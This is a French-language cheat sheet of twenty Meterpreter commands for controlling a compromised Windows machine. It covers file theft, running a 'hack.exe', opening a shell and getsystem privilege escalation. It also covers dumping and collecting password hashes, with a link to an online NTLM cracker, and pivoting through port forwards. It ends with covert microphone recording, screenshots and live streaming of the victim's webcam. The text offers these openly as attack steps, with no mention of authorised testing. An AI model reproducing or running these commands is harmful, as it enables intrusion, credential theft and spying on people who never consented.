Commande 1 – Téléversement d’un fichier vers la cible Windows

Il est possible de téléverser n’importe quel fichier de votre Pc local vers le Pc cible.

    Syntaxe: Upload <file><destination>

    ex. meterpreter >upload tntsecurite.txt c:
    Note: Utilisez upload -r pour téléverser des répertoires et leur contenu.

Commande 2 – Téléchargement d’un fichier provenant de la cible Windows

La commande « download » télécharge un fichier provenant du Pc cible Windows.

    Syntaxe: Download <fichier><chemin ou le sauver>

    Note: remarquez dans l’exemple les 2 \\ dans le chemin du fichier lors d’un entrer de chemin Windows.

    ex. meterpreter >download c:\\windows\\temp\\tnt /tmp

    Note: Utlisez download -r pour télécharger un répertoire complet.

Commande 3 – Exécuter un fichier .exe sur la cible

Il est possible d’exécuter une application sur la machine cible en exécuant la commande execute.

    Syntaxe: Execute -f <chemin>

    note: Remaquez dans l’example les 2 \\ qui sont nécessaire lors d’entrer de chemin Windows.

    Ex. meterpreter >execute -f c:\\ »Documents and Settings »\\temp\\hack.exe

Commande 4 – Création d’un nouveau canal avec CMD

Par exemple si on veut exécuter un command prompt sur la cible, la commande serait:

    Syntaxe: Execute -f <path>

    ex. meterpreter >execute -f cmd -c

Commande 5 – Afficher les processus

La commande « ps » affiche les processus roulant sur la cible.

    Syntaxe: ps

    ex. meterpreter >ps

Commande 6 – Ouvrir un shell sur le Pc cible

La commande « shell » vous donneras accès à un shell standard sur le système cible.

    Syntaxe: shell

    ex. meterpreter >shell

Commande 7 – Avoir les droits administarteurs

La commande « getsystem » vous donnera les droits administarteurs sur le Pc cible.

    Syntaxe: getsystem

    ex. meterpreter >getsystem

Commande 8 – Capturer tous les « hash » avec hashdump

Utilisons le pouvoir d’un shell meterpreter en capturant tous les comptes et les mots de passe contenus sur la cible.  Ils seront affiché en format NTLM hash et peut-être « cracké » à l’aide plusieurs outils en ligne.  En voici un: https://hashkiller.co.uk/ntlm-decrypter.aspx

    Syntaxe: hashdump

    ex. meterpreter >hashdump

Commande 9 – Capturer des « hash » à l’aide de credcollect

Un script similaire credential_collector pour  capturer les jetons de la machine cible.

    Syntaxe: run credcollect

    ex. meterpreter >run credcollect

Commande 10 – Création d’une redirection de port

La commande « portfwd » à l’intérieur de Meterpreter est communément utilisé comme une technique de pivot, donnant accès aux Pc qui normalement n’est pas accessible de la machine cible.

L’option add ajoutera la redirection de port à la liste et essetiellement va créer un tunnel.

    Syntaxe: portfwd add -l <port number> -p <port number> -l <Target IP>

    ex. meterpreter >portfwd add -l 1337 -p 1337 -r 192.168.38.101

Commande 11 – Effacement de redirection de port

Les entrées de redirection de ports sont effacées.

    Syntaxe: portfwd delete -l <port number> -p <port number> -r <target IP>

    ex. meterpreter >portfwd delete -l 1337 -p 1337 -r 192.168.38.101

Note: La commande « portfwd list » affichera la liste de redirection de port et pour retirer tous les redirections dans la liste « portfwd flush » peut-être utilisé.

Commande 12 – Rechercher des fichiers sur le Pc cible

La commande « search » permet de chercher pour des fichiers spécifiques sur la machine cible.  La commande est capable de chercher dans tous le système ou dans un répertoire spécifique.  Par exemple si on veut rechercher tous les fichiers .txt la commande serait:

    Syntaxe: search -f *.txt

    ex. meterpreter >search -f *.txt

Commande 13 – Obtenir les informations de l’utilisateur

exécuter « getuid » affichera l’utilisateur utilisé par le serveur Meterpreter comme sur le Pc cible.

    Syntaxe: getuid

    ex. meterpreter >getuid

Commande 14 – Obtenir les informations du système

La commande « sysinfo » vous affichera de l’information à propos du système exploité, comme le nom, le type de OS, l’architecture, la langue, etc.

    Syntaxe: sysinfo

    ex. meterpreter >sysinfo

Commande 15 – Enregistrement du son

La commande « record_mic » enregistre par défaut 1 seconde de son provenant du micro par défaut du Pc cible.

    Syntaxe: record_mic

    Note: Il y a des arguments qui peuvent être utilisés avec la commande « record_mic », le plus important est -d pour définir le temps d’enregistrement autre que 1 seconde.

    ex. meterpreter >record_mic -d 15

Commande 16 – Capture d’écran du bureau

La commande « screenshot » affiche ce qui est présentement affiché sur l’écran du Pc cible.

    Syntaxe: screenshot

    ex. meterpreter >screenshot

Commande 17 – Afficher tous les caméras du Pc cible

La commande « webcam_list » affiche tous les caméras sur le Pc cible Windows

    Syntaxe: webcam_list

    ex. meterpreter > webcam_list

Commande 18 – Une prise d’écran du Pc cible Windows

La commande « webcam_snap » affichera une capture d’écran de la caméra par défaut du Pc cible.

    Syntaxe: webcam_snap

    ex. meterpreter > webcam_snap

Commande 19 – Discussion avec l’utilisateur Windows

La commande « webcam_chat » vous donne accès à discuter avec la personne utilisant le Pc cible.

    Syntaxe: webcam_chat

    ex. meterpreter >webcam_chat

Commande 20 – diffusion de la caméra

La commande « webcam_stream » vous permet de diffuser à votre écran ce que la caméra de la victime film en temps réel.

    Syntaxe: webcam_stream

    ex. meterpreter >webcam_stream